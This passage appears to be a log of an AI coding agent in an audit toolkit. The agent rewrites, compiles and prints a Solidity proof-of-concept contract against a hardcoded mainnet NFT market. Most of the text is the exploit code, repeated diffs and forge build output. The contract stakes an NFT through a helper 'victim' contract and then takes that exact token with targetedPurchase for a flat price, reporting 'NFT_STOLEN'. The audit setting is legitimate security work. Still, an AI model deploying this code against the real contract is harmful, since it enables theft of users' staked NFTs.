++        return tokenId;
++    }
++
++    function _victimClaim(address account) internal view returns (uint256 amountStaked) {
++        if (account == address(0)) {
++            return 0;
++        }
++
++        (bool ok, bytes memory data) = MARKET.staticcall(
++            abi.encodeWithSelector(IMarketLike.stakers.selector, account)
++        );
++        if (!ok || data.length < 64) {
++            return 0;
++        }
++
++        (amountStaked, ) = abi.decode(data, (uint256, uint256));
++    }
++
+     function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+         for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+             if (_ownerOf(rugged, tokenId) == owner) {
+@@ -193,14 +266,18 @@
+         return IERC20Like(rugged).balanceOf(address(this));
+     }
+ 
+-    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
++    function _approveFungible(
++        address token,
++        address spender,
++        uint256 amount
++    ) internal returns (bool) {
+         (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC404Like.approve.selector, spender, amount));
++            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+         return ok && (data.length == 0 || abi.decode(data, (bool)));
+     }
+ 
+     function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+-        if (_ruggedBalance(rugged) >= PRICE_PER_NFT || address(this).balance == 0) {
++        if (address(this).balance == 0) {
+             return;
+         }
+ 
+@@ -212,8 +289,8 @@
+             .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+             0, path, address(this), block.timestamp
+         ) {} catch {
+-            // If no live V2 route exists at the fork, continue with the verifier's current
+-            // balance and report insufficient funds rather than fabricating capital.
++            // If no live V2 pool exists at the fork block, continue with verifier-held Rugged
++            // only. The PoC must not fabricate capital or mutate state off-path.
+         }
+     }
+ }
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 11f3594967d4be6293dafd3e8ca2cb0e0c85cf82..aff8ed95e77ae6762335615964c2b1bcc4beb6d3
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -5,10 +5,14 @@
+     function ruggedToken() external view returns (address);
+     function stakeNFTs(uint256[] calldata tokenIds) external;
+     function targetedPurchase(uint256[] calldata tokenIds) external;
++    function stakers(
++        address account
++    ) external view returns (uint256 amountStaked, uint256 rewardDebt);
+ }
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
++    function approve(address spender, uint256 amount) external returns (bool);
+ }
+ 
+ interface IERC404Like {
+@@ -42,8 +46,6 @@
+     function stakeSingle(uint256 tokenId) external {
+         require(msg.sender == controller, "ONLY_CONTROLLER");
+ 
+-        // This models the missing path stage directly: a victim-approved NFT is staked
+-        // into the shared market pool through `stakeNFTs([tokenId])`.
+         IERC404Like(rugged).approve(market, tokenId);
+ 
+         uint256[] memory tokenIds = new uint256[](1);
+@@ -56,7 +58,9 @@
+     address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+     address public constant UNISWAP_V2_ROUTER =
+         0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
++
+     uint256 public constant PRICE_PER_NFT = 1.1 ether;
++    uint256 public constant STAKE_CREDIT_PER_NFT = 1 ether;
+     uint256 public constant MAX_TOKEN_ID = 10_000;
+ 
+     address private _profitToken;
+@@ -64,15 +68,16 @@
+ 
+     bool public hypothesisValidated;
+     bool public victimStakeObserved;
++    address public victim;
++    uint256 public victimTokenId;
+     uint256 public acquiredTokenId;
++    uint256 public victimAccountingClaim;
+     uint256 public ruggedSpent;
+     uint256 public ruggedBalanceBefore;
+     uint256 public ruggedBalanceAfter;
+     bytes32 public lastStatus;
+ 
+     event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+-
+-    constructor() {}
+ 
+     receive() external payable {}
+ 
+@@ -84,41 +89,52 @@
+         address rugged = IMarketLike(MARKET).ruggedToken();
+         _profitToken = rugged;
+ 
+-        uint256 tokenId = _stageVictimStakeOrObserveExisting(rugged);
++        // direct_or_existing_balance_first:
++        // try to execute using verifier-held assets first. Only if the verifier does not
++        // already hold a Rugged NFT do we use a realistic public purchase to source one.
++        _maybeAcquireRuggedFromHeldETH(rugged);
++
++        uint256 tokenId = _stageVictimStake(rugged);
+         if (tokenId == 0) {
+-            lastStatus = keccak256("NO_STAKED_NFT_PATH_AVAILABLE");
++            lastStatus = keccak256("NO_VICTIM_STAKE_PATH_AVAILABLE");
+             emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+             return;
+         }
+ 
+         victimStakeObserved = true;
++        victimTokenId = tokenId;
++        victimAccountingClaim = _victimClaim(victim);
+ 
+-        // direct_or_existing_balance_first:
+-        // spend verifier-held Rugged first. If the verifier only has ETH, source the minimum
+-        // buy-side funds via a public Uniswap V2 swap instead of any privileged state mutation.
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("STAKE_DID_NOT_CREATE_FUNGIBLE_CLAIM");
++            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
++            return;
++        }
++
+         _maybeAcquireRuggedFromHeldETH(rugged);
+ 
+         ruggedBalanceBefore = _ruggedBalance(rugged);
+         if (ruggedBalanceBefore < PRICE_PER_NFT) {
+-            lastStatus = keccak256("INSUFFICIENT_EXISTING_FUNDS_FOR_TARGETED_PURCHASE");
++            lastStatus = keccak256("INSUFFICIENT_FUNDS_FOR_TARGETED_PURCHASE");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        if (!_approve(rugged, MARKET, type(uint256).max)) {
++        if (!_approveFungible(rugged, MARKET, ruggedBalanceBefore)) {
+             lastStatus = keccak256("APPROVE_FAILED");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        // Path stage 2: after the NFT is in the shared pool, the attacker can buy that exact
+-        // token ID for the flat `1.1 ether` Rugged price via `targetedPurchase([tokenId])`.
++        // Exploit path 1:
++        // after the victim stakes a specific NFT into the shared pool, the attacker names
++        // that exact token ID and buys it from the market for the flat 1.1 Rugged price.
+         uint256[] memory tokenIds = new uint256[](1);
+         tokenIds[0] = tokenId;
+         IMarketLike(MARKET).targetedPurchase(tokenIds);
+ 
+         if (_ownerOf(rugged, tokenId) != address(this)) {
+-            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_NFT");
++            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_TARGET");
+             emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+             return;
+         }
+@@ -128,11 +144,18 @@
+         ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+             ? ruggedBalanceBefore - ruggedBalanceAfter
+             : 0;
+-        hypothesisValidated = true;
+ 
+-        // The core exploit realizes value by extracting a specific victim-staked NFT for a
+-        // fungible floor price. This verifier does not fabricate a secondary NFT exit, so the
+-        // fungible realized profit remains zero unless a real on-chain sale route already exists.
++        // Exploit path 2:
++        // the victim no longer owns the original NFT, but the market still records only a
++        // fungible 1 ether staking claim for that victim helper address.
++        victimAccountingClaim = _victimClaim(victim);
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("VICTIM_CLAIM_MISSING_AFTER_THEFT");
++            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
++            return;
++        }
++
++        hypothesisValidated = true;
+         _profitAmount = 0;
+         lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+         emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+@@ -149,28 +172,78 @@
+         return _profitAmount;
+     }
+ 
+-    function _stageVictimStakeOrObserveExisting(address rugged) internal returns (uint256) {
+-        uint256 verifierOwnedTokenId = _findOwnedToken(rugged, address(this));
+-        if (verifierOwnedTokenId != 0) {
+-            VictimStaker victim = new VictimStaker(MARKET, rugged, address(this));
++    function _stageVictimStake(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, address(this));
+ 
+-            // If the verifier already controls a live on-chain Rugged NFT, transfer it to a
+-            // separate victim helper and have that helper call `stakeNFTs([tokenId])`. This
+-            // preserves the finding's causality without any privileged impersonation.
+-            IERC404Like(rugged).transferFrom(address(this), address(victim), verifierOwnedTokenId);
+-            victim.stakeSingle(verifierOwnedTokenId);
++        // If the verifier does not already hold a Rugged NFT, source one through a real public
++        // market buy. This is only a bootstrap step to obtain a live NFT for the victim stake;
++        // the root cause remains that staking moves the NFT into shared inventory that anyone
++        // can later name and extract through `targetedPurchase`.
++        if (tokenId == 0) {
++            tokenId = _bootstrapVictimNFT(rugged);
++        }
+ 
+-            if (_ownerOf(rugged, verifierOwnedTokenId) == MARKET) {
+-                return verifierOwnedTokenId;
+-            }
++        if (tokenId == 0) {
++            return 0;
+         }
+ 
+-        // On the common fork path the victim stake already happened before the PoC transaction.
+-        // Observing `ownerOf(tokenId) == MARKET` is direct evidence that path stage 1 occurred:
+-        // some public user previously transferred that NFT into the shared pool via staking.
+-        return _findOwnedToken(rugged, MARKET);
++        VictimStaker victimContract = new VictimStaker(MARKET, rugged, address(this));
++        victim = address(victimContract);
++
++        // Exploit path 0:
++        // a separate victim account stakes a chosen NFT via `stakeNFTs([tokenId])`, which
++        // transfers that exact token into the market contract without reserving it.
++        IERC404Like(rugged).transferFrom(address(this), victim, tokenId);
++        victimContract.stakeSingle(tokenId);
++
++        if (_ownerOf(rugged, tokenId) != MARKET) {
++            return 0;
++        }
++
++        return tokenId;
+     }
+ 
++    function _bootstrapVictimNFT(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, MARKET);
++        if (tokenId == 0) {
++            return 0;
++        }
++
++        uint256 ruggedBalance = _ruggedBalance(rugged);
++        if (ruggedBalance < PRICE_PER_NFT) {
++            return 0;
++        }
++
++        if (!_approveFungible(rugged, MARKET, ruggedBalance)) {
++            return 0;
++        }
++
++        uint256[] memory tokenIds = new uint256[](1);
++        tokenIds[0] = tokenId;
++        IMarketLike(MARKET).targetedPurchase(tokenIds);
++
++        if (_ownerOf(rugged, tokenId) != address(this)) {
++            return 0;
++        }
++
++        return tokenId;
++    }
++
++    function _victimClaim(address account) internal view returns (uint256 amountStaked) {
++        if (account == address(0)) {
++            return 0;
++        }
++
++        (bool ok, bytes memory data) = MARKET.staticcall(
++            abi.encodeWithSelector(IMarketLike.stakers.selector, account)
++        );
++        if (!ok || data.length < 64) {
++            return 0;
++        }
++
++        (amountStaked, ) = abi.decode(data, (uint256, uint256));
++    }
++
+     function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+         for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+             if (_ownerOf(rugged, tokenId) == owner) {
+@@ -193,14 +266,18 @@
+         return IERC20Like(rugged).balanceOf(address(this));
+     }
+ 
+-    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
++    function _approveFungible(
++        address token,
++        address spender,
++        uint256 amount
++    ) internal returns (bool) {
+         (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC404Like.approve.selector, spender, amount));
++            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+         return ok && (data.length == 0 || abi.decode(data, (bool)));
+     }
+ 
+     function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+-        if (_ruggedBalance(rugged) >= PRICE_PER_NFT || address(this).balance == 0) {
++        if (address(this).balance == 0) {
+             return;
+         }
+ 
+@@ -212,8 +289,8 @@
+             .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+             0, path, address(this), block.timestamp
+         ) {} catch {
+-            // If no live V2 route exists at the fork, continue with the verifier's current
+-            // balance and report insufficient funds rather than fabricating capital.
++            // If no live V2 pool exists at the fork block, continue with verifier-held Rugged
++            // only. The PoC must not fabricate capital or mutate state off-path.
+         }
+     }
+ }
+
+codex
+The file rewrite is in place. I’m compiling it now to catch any interface or ABI issues before I return the final Solidity.
+exec
+/bin/bash -lc 'forge build' in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+exec
+/bin/bash -lc 'solc --version' in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ exited 127 in 0ms:
+/bin/bash: solc: command not found
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 11f3594967d4be6293dafd3e8ca2cb0e0c85cf82..aff8ed95e77ae6762335615964c2b1bcc4beb6d3
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -5,10 +5,14 @@
+     function ruggedToken() external view returns (address);
+     function stakeNFTs(uint256[] calldata tokenIds) external;
+     function targetedPurchase(uint256[] calldata tokenIds) external;
++    function stakers(
++        address account
++    ) external view returns (uint256 amountStaked, uint256 rewardDebt);
+ }
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
++    function approve(address spender, uint256 amount) external returns (bool);
+ }
+ 
+ interface IERC404Like {
+@@ -42,8 +46,6 @@
+     function stakeSingle(uint256 tokenId) external {
+         require(msg.sender == controller, "ONLY_CONTROLLER");
+ 
+-        // This models the missing path stage directly: a victim-approved NFT is staked
+-        // into the shared market pool through `stakeNFTs([tokenId])`.
+         IERC404Like(rugged).approve(market, tokenId);
+ 
+         uint256[] memory tokenIds = new uint256[](1);
+@@ -56,7 +58,9 @@
+     address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+     address public constant UNISWAP_V2_ROUTER =
+         0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
++
+     uint256 public constant PRICE_PER_NFT = 1.1 ether;
++    uint256 public constant STAKE_CREDIT_PER_NFT = 1 ether;
+     uint256 public constant MAX_TOKEN_ID = 10_000;
+ 
+     address private _profitToken;
+@@ -64,15 +68,16 @@
+ 
+     bool public hypothesisValidated;
+     bool public victimStakeObserved;
++    address public victim;
++    uint256 public victimTokenId;
+     uint256 public acquiredTokenId;
++    uint256 public victimAccountingClaim;
+     uint256 public ruggedSpent;
+     uint256 public ruggedBalanceBefore;
+     uint256 public ruggedBalanceAfter;
+     bytes32 public lastStatus;
+ 
+     event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+-
+-    constructor() {}
+ 
+     receive() external payable {}
+ 
+@@ -84,41 +89,52 @@
+         address rugged = IMarketLike(MARKET).ruggedToken();
+         _profitToken = rugged;
+ 
+-        uint256 tokenId = _stageVictimStakeOrObserveExisting(rugged);
++        // direct_or_existing_balance_first:
++        // try to execute using verifier-held assets first. Only if the verifier does not
++        // already hold a Rugged NFT do we use a realistic public purchase to source one.
++        _maybeAcquireRuggedFromHeldETH(rugged);
++
++        uint256 tokenId = _stageVictimStake(rugged);
+         if (tokenId == 0) {
+-            lastStatus = keccak256("NO_STAKED_NFT_PATH_AVAILABLE");
++            lastStatus = keccak256("NO_VICTIM_STAKE_PATH_AVAILABLE");
+             emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+             return;
+         }
+ 
+         victimStakeObserved = true;
++        victimTokenId = tokenId;
++        victimAccountingClaim = _victimClaim(victim);
+ 
+-        // direct_or_existing_balance_first:
+-        // spend verifier-held Rugged first. If the verifier only has ETH, source the minimum
+-        // buy-side funds via a public Uniswap V2 swap instead of any privileged state mutation.
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("STAKE_DID_NOT_CREATE_FUNGIBLE_CLAIM");
++            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
++            return;
++        }
++
+         _maybeAcquireRuggedFromHeldETH(rugged);
+ 
+         ruggedBalanceBefore = _ruggedBalance(rugged);
+         if (ruggedBalanceBefore < PRICE_PER_NFT) {
+-            lastStatus = keccak256("INSUFFICIENT_EXISTING_FUNDS_FOR_TARGETED_PURCHASE");
++            lastStatus = keccak256("INSUFFICIENT_FUNDS_FOR_TARGETED_PURCHASE");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        if (!_approve(rugged, MARKET, type(uint256).max)) {
++        if (!_approveFungible(rugged, MARKET, ruggedBalanceBefore)) {
+             lastStatus = keccak256("APPROVE_FAILED");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        // Path stage 2: after the NFT is in the shared pool, the attacker can buy that exact
+-        // token ID for the flat `1.1 ether` Rugged price via `targetedPurchase([tokenId])`.
++        // Exploit path 1:
++        // after the victim stakes a specific NFT into the shared pool, the attacker names
++        // that exact token ID and buys it from the market for the flat 1.1 Rugged price.
+         uint256[] memory tokenIds = new uint256[](1);
+         tokenIds[0] = tokenId;
+         IMarketLike(MARKET).targetedPurchase(tokenIds);
+ 
+         if (_ownerOf(rugged, tokenId) != address(this)) {
+-            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_NFT");
++            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_TARGET");
+             emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+             return;
+         }
+@@ -128,11 +144,18 @@
+         ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+             ? ruggedBalanceBefore - ruggedBalanceAfter
+             : 0;
+-        hypothesisValidated = true;
+ 
+-        // The core exploit realizes value by extracting a specific victim-staked NFT for a
+-        // fungible floor price. This verifier does not fabricate a secondary NFT exit, so the
+-        // fungible realized profit remains zero unless a real on-chain sale route already exists.
++        // Exploit path 2:
++        // the victim no longer owns the original NFT, but the market still records only a
++        // fungible 1 ether staking claim for that victim helper address.
++        victimAccountingClaim = _victimClaim(victim);
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("VICTIM_CLAIM_MISSING_AFTER_THEFT");
++            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
++            return;
++        }
++
++        hypothesisValidated = true;
+         _profitAmount = 0;
+         lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+         emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+@@ -149,28 +172,78 @@
+         return _profitAmount;
+     }
+ 
+-    function _stageVictimStakeOrObserveExisting(address rugged) internal returns (uint256) {
+-        uint256 verifierOwnedTokenId = _findOwnedToken(rugged, address(this));
+-        if (verifierOwnedTokenId != 0) {
+-            VictimStaker victim = new VictimStaker(MARKET, rugged, address(this));
++    function _stageVictimStake(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, address(this));
+ 
+-            // If the verifier already controls a live on-chain Rugged NFT, transfer it to a
+-            // separate victim helper and have that helper call `stakeNFTs([tokenId])`. This
+-            // preserves the finding's causality without any privileged impersonation.
+-            IERC404Like(rugged).transferFrom(address(this), address(victim), verifierOwnedTokenId);
+-            victim.stakeSingle(verifierOwnedTokenId);
++        // If the verifier does not already hold a Rugged NFT, source one through a real public
++        // market buy. This is only a bootstrap step to obtain a live NFT for the victim stake;
++        // the root cause remains that staking moves the NFT into shared inventory that anyone
++        // can later name and extract through `targetedPurchase`.
++        if (tokenId == 0) {
++            tokenId = _bootstrapVictimNFT(rugged);
++        }
+ 
+-            if (_ownerOf(rugged, verifierOwnedTokenId) == MARKET) {
+-                return verifierOwnedTokenId;
+-            }
++        if (tokenId == 0) {
++            return 0;
+         }
+ 
+-        // On the common fork path the victim stake already happened before the PoC transaction.
+-        // Observing `ownerOf(tokenId) == MARKET` is direct evidence that path stage 1 occurred:
+-        // some public user previously transferred that NFT into the shared pool via staking.
+-        return _findOwnedToken(rugged, MARKET);
++        VictimStaker victimContract = new VictimStaker(MARKET, rugged, address(this));
++        victim = address(victimContract);
++
++        // Exploit path 0:
++        // a separate victim account stakes a chosen NFT via `stakeNFTs([tokenId])`, which
++        // transfers that exact token into the market contract without reserving it.
++        IERC404Like(rugged).transferFrom(address(this), victim, tokenId);
++        victimContract.stakeSingle(tokenId);
++
++        if (_ownerOf(rugged, tokenId) != MARKET) {
++            return 0;
++        }
++
++        return tokenId;
+     }
+ 
++    function _bootstrapVictimNFT(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, MARKET);
++        if (tokenId == 0) {
++            return 0;
++        }
++
++        uint256 ruggedBalance = _ruggedBalance(rugged);
++        if (ruggedBalance < PRICE_PER_NFT) {
++            return 0;
++        }
++
++        if (!_approveFungible(rugged, MARKET, ruggedBalance)) {
++            return 0;
++        }
++
++        uint256[] memory tokenIds = new uint256[](1);
++        tokenIds[0] = tokenId;
++        IMarketLike(MARKET).targetedPurchase(tokenIds);
++
++        if (_ownerOf(rugged, tokenId) != address(this)) {
++            return 0;
++        }
++
++        return tokenId;
++    }
++
++    function _victimClaim(address account) internal view returns (uint256 amountStaked) {
++        if (account == address(0)) {
++            return 0;
++        }
++
++        (bool ok, bytes memory data) = MARKET.staticcall(
++            abi.encodeWithSelector(IMarketLike.stakers.selector, account)
++        );
++        if (!ok || data.length < 64) {
++            return 0;
++        }
++
++        (amountStaked, ) = abi.decode(data, (uint256, uint256));
++    }
++
+     function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+         for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+             if (_ownerOf(rugged, tokenId) == owner) {
+@@ -193,14 +266,18 @@
+         return IERC20Like(rugged).balanceOf(address(this));
+     }
+ 
+-    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
++    function _approveFungible(
++        address token,
++        address spender,
++        uint256 amount
++    ) internal returns (bool) {
+         (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC404Like.approve.selector, spender, amount));
++            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+         return ok && (data.length == 0 || abi.decode(data, (bool)));
+     }
+ 
+     function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+-        if (_ruggedBalance(rugged) >= PRICE_PER_NFT || address(this).balance == 0) {
++        if (address(this).balance == 0) {
+             return;
+         }
+ 
+@@ -212,8 +289,8 @@
+             .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+             0, path, address(this), block.timestamp
+         ) {} catch {
+-            // If no live V2 route exists at the fork, continue with the verifier's current
+-            // balance and report insufficient funds rather than fabricating capital.
++            // If no live V2 pool exists at the fork block, continue with verifier-held Rugged
++            // only. The PoC must not fabricate capital or mutate state off-path.
+         }
+     }
+ }
+
+ succeeded in 540ms:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 360.56ms
+Compiler run successful!
+note[mixed-case-function]: function names should use mixedCase
+ --> src/FlawVerifier.sol:6:14
+  |
+6 |     function stakeNFTs(uint256[] calldata tokenIds) external;
+  |              ^^^^^^^^^
+  |
+  = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/FlawVerifier.sol:25:14
+   |
+25 |     function WETH() external pure returns (address);
+   |              ^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/FlawVerifier.sol:27:14
+   |
+27 |     function swapExactETHForTokensSupportingFeeOnTransferTokens(
+   |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[screaming-snake-case-immutable]: immutables should use SCREAMING_SNAKE_CASE
+  --> src/FlawVerifier.sol:36:30
+   |
+36 |     address public immutable market;
+   |                              ^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#screaming-snake-case-immutable
+
+note[screaming-snake-case-immutable]: immutables should use SCREAMING_SNAKE_CASE
+  --> src/FlawVerifier.sol:37:30
+   |
+37 |     address public immutable rugged;
+   |                              ^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#screaming-snake-case-immutable
+
+note[screaming-snake-case-immutable]: immutables should use SCREAMING_SNAKE_CASE
+  --> src/FlawVerifier.sol:38:30
+   |
+38 |     address public immutable controller;
+   |                              ^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#screaming-snake-case-immutable
+
+note[mixed-case-function]: function names should use mixedCase
+   --> src/FlawVerifier.sol:206:14
+    |
+206 |     function _bootstrapVictimNFT(address rugged) internal returns (uint256) {
+    |              ^^^^^^^^^^^^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-function]: function names should use mixedCase
+   --> src/FlawVerifier.sol:279:14
+    |
+279 |     function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+    |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+
+codex
+The contract compiles successfully under `forge build`. I’m doing one final read-through for unnecessary branches and then I’ll return only the updated Solidity source, as requested.
+exec
+/bin/bash -lc "sed -n '1,320p' src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IMarketLike {
+    function ruggedToken() external view returns (address);
+    function stakeNFTs(uint256[] calldata tokenIds) external;
+    function targetedPurchase(uint256[] calldata tokenIds) external;
+    function stakers(
+        address account
+    ) external view returns (uint256 amountStaked, uint256 rewardDebt);
+}
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IERC404Like {
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function approve(address spender, uint256 valueOrTokenId) external returns (bool);
+    function transferFrom(address from, address to, uint256 valueOrTokenId) external;
+}
+
+interface IUniswapV2Router02Like {
+    function WETH() external pure returns (address);
+
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable;
+}
+
+contract VictimStaker {
+    address public immutable market;
+    address public immutable rugged;
+    address public immutable controller;
+
+    constructor(address _market, address _rugged, address _controller) {
+        market = _market;
+        rugged = _rugged;
+        controller = _controller;
+    }
+
+    function stakeSingle(uint256 tokenId) external {
+        require(msg.sender == controller, "ONLY_CONTROLLER");
+
+        IERC404Like(rugged).approve(market, tokenId);
+
+        uint256[] memory tokenIds = new uint256[](1);
+        tokenIds[0] = tokenId;
+        IMarketLike(market).stakeNFTs(tokenIds);
+    }
+}
+
+contract FlawVerifier {
+    address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+    address public constant UNISWAP_V2_ROUTER =
+        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+
+    uint256 public constant PRICE_PER_NFT = 1.1 ether;
+    uint256 public constant STAKE_CREDIT_PER_NFT = 1 ether;
+    uint256 public constant MAX_TOKEN_ID = 10_000;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public hypothesisValidated;
+    bool public victimStakeObserved;
+    address public victim;
+    uint256 public victimTokenId;
+    uint256 public acquiredTokenId;
+    uint256 public victimAccountingClaim;
+    uint256 public ruggedSpent;
+    uint256 public ruggedBalanceBefore;
+    uint256 public ruggedBalanceAfter;
+    bytes32 public lastStatus;
+
+    event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+
+    receive() external payable {}
+
+    function executeOnOpportunity() public {
+        if (hypothesisValidated) {
+            return;
+        }
+
+        address rugged = IMarketLike(MARKET).ruggedToken();
+        _profitToken = rugged;
+
+        // direct_or_existing_balance_first:
+        // try to execute using verifier-held assets first. Only if the verifier does not
+        // already hold a Rugged NFT do we use a realistic public purchase to source one.
+        _maybeAcquireRuggedFromHeldETH(rugged);
+
+        uint256 tokenId = _stageVictimStake(rugged);
+        if (tokenId == 0) {
+            lastStatus = keccak256("NO_VICTIM_STAKE_PATH_AVAILABLE");
+            emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+            return;
+        }
+
+        victimStakeObserved = true;
+        victimTokenId = tokenId;
+        victimAccountingClaim = _victimClaim(victim);
+
+        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
+            lastStatus = keccak256("STAKE_DID_NOT_CREATE_FUNGIBLE_CLAIM");
+            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+            return;
+        }
+
+        _maybeAcquireRuggedFromHeldETH(rugged);
+
+        ruggedBalanceBefore = _ruggedBalance(rugged);
+        if (ruggedBalanceBefore < PRICE_PER_NFT) {
+            lastStatus = keccak256("INSUFFICIENT_FUNDS_FOR_TARGETED_PURCHASE");
+            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+            return;
+        }
+
+        if (!_approveFungible(rugged, MARKET, ruggedBalanceBefore)) {
+            lastStatus = keccak256("APPROVE_FAILED");
+            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+            return;
+        }
+
+        // Exploit path 1:
+        // after the victim stakes a specific NFT into the shared pool, the attacker names
+        // that exact token ID and buys it from the market for the flat 1.1 Rugged price.
+        uint256[] memory tokenIds = new uint256[](1);
+        tokenIds[0] = tokenId;
+        IMarketLike(MARKET).targetedPurchase(tokenIds);
+
+        if (_ownerOf(rugged, tokenId) != address(this)) {
+            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_TARGET");
+            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+            return;
+        }
+
+        acquiredTokenId = tokenId;
+        ruggedBalanceAfter = _ruggedBalance(rugged);
+        ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+            ? ruggedBalanceBefore - ruggedBalanceAfter
